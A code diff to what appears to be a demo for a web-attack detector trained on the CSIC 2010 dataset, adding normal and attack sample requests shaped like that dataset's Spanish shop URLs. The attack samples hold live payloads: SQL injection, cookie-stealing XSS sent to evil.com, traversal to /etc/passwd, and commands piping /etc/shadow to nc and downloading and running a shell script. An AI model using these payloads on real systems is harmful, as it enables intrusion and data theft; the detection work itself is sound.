@@ -37,37 +37,65 @@ def load_bundle():
 
 
 # ---- Sample requests để demo nhanh ----
+# Lưu ý quan trọng: CSIC 2010 dataset mô phỏng 1 trang web thương mại điện tử
+# tiếng Tây Ban Nha, mọi request (cả normal và attack) đều dùng path dạng
+# /tienda1/... với các tham số như id, nombre, precio, cantidad, B1...
+# Dùng path "lạ" (ví dụ /index.php, /login.php) sẽ KHÔNG khớp phân phối dữ
+# liệu train -> model dễ coi nhầm là bất thường dù request hoàn toàn vô hại.
+# Vì vậy các mẫu dưới đây bám theo đúng cấu trúc URL/tham số thật của CSIC.
 SAMPLE_REQUESTS = {
     "-- Choose a sample request --": None,
-    "Normal: GET homepage": {
+    "Normal: Search for products": {
         "method": "GET",
-        "url": "/index.php?page=home",
+        "url": "/tienda1/publico/productos.jsp?id=2&nombre=Jam%F3n+Lim%F3n&precio=39",
         "body": "",
     },
-    "Normal: Valid POST login": {
+    "Normal: Add to cart": {
         "method": "POST",
-        "url": "/login.php",
-        "body": "username=alice&password=hunter2",
+        "url": "/tienda1/publico/anadir.jsp",
+        "body": "id=3&nombre=Queso+Manchego&precio=85&cantidad=2&B1=A%F1adir+al+carrito",
+    },
+    "Normal: Valid login": {
+        "method": "POST",
+        "url": "/tienda1/publico/autenticar.jsp",
+        "body": "modo=entrar&login=alvarez&pwd=hunter2&B1=Entrar",
     },
     "Attack: SQL Injection": {
-        "method": "GET",
-        "url": "/product.php?id=1 UNION SELECT username,password FROM users--",
-        "body": "",
+        "method": "POST",
+        "url": "/tienda1/publico/anadir.jsp",
+        "body": "id=2&nombre=Jamon&precio=85&cantidad=';+DROP+TABLE+usuarios;+SELECT+*+FROM+datos+WHERE+nombre+LIKE+'%&B1=Anadir+al+carrito",
     },
     "Attack: XSS": {
         "method": "POST",
-        "url": "/comment.php",
-        "body": "comment=<script>alert(document.cookie)</script>",
+        "url": "/tienda1/publico/comentario.jsp",
+        "body": "id=1&comentario=<script>alert(document.cookie)</script>&B1=Enviar",
     },
     "Attack: Path Traversal": {
         "method": "GET",
-        "url": "/download.php?file=../../../../etc/passwd",
+        "url": "/tienda1/publico/mostrar.jsp?fichero=../../../../etc/passwd",
         "body": "",
     },
     "Attack: Command Injection": {
         "method": "POST",
-        "url": "/ping.php",
-        "body": "host=127.0.0.1; cat /etc/passwd",
+        "url": "/tienda1/publico/anadir.jsp",
+        "body": "id=1; cat /etc/passwd&nombre=test&precio=10&B1=Anadir",
+    },
+    "Attack: SQLi + XSS": {
+        "method": "POST",
+        "url": "/tienda1/publico/anadir.jsp?id=1' UNION SELECT username,password FROM usuarios--",
+        "body": "nombre=<script>alert(document.cookie)</script>&precio=' OR '1'='1&cantidad=1&B1=Anadir",
+    },
+    "Attack: Path Traversal + Command Injection": {
+        "method": "GET",
+        "url": "/tienda1/publico/mostrar.jsp?fichero=../../../../etc/passwd;cat /etc/shadow|nc 10.0.0.1 4444",
+        "body": "",
+    },
+    "Attack: SQLi + XSS + CMD + Traversal": {
+        "method": "POST",
+        "url": "/tienda1/publico/anadir.jsp?id=1' UNION SELECT * FROM usuarios--&fichero=../../../etc/passwd",
+        "body": "nombre=<script>document.location='http://evil.com/'+document.cookie</script>&"
+                "precio=1; wget http://evil.com/shell.sh -O /tmp/x; bash /tmp/x&"
+                "cantidad=' OR sleep(5)='&B1=Anadir",
     },
 }
 
